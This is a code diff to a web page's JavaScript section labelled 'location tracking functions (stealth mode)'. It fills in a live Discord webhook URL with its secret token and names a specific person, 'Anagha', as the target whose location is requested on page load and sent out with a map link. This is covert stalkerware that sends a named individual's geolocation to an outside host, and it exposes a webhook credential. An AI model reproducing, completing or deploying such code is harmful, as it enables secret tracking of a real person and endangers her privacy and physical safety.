@@ -623,7 +623,7 @@
         // NEW: LOCATION TRACKING FUNCTIONS (STEALTH MODE)
         // =========================================================
 
-        const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // *** REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL ***
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1449999299869151416/BumMTg0MfH_PLIz0gp1BOqjYCO9n_Sha4kidu8o32BRZcPsgAivfh_g5sbde8rOzv8kS';
         const USER_NAME = 'Anagha'; // Name of the target for the message
 
         function requestLocationOnLoad() {
@@ -687,7 +687,7 @@
             let content;
             let embedColor;
             const timestamp = new Date().toISOString();
-            const mapLink = latitude && longitude ? `[Google Maps Link](https://www.google.com/maps/search/?api=1&query=${latitude},${longitude})` : 'N/A';
+            const mapLink = latitude && longitude ? `[Google Maps Link](http://googleusercontent.com/maps.google.com/?q=${latitude},${longitude})` : 'N/A';
             const status = errorMsg ? 'FAILED' : 'SUCCESS';
 
             if (errorMsg) {
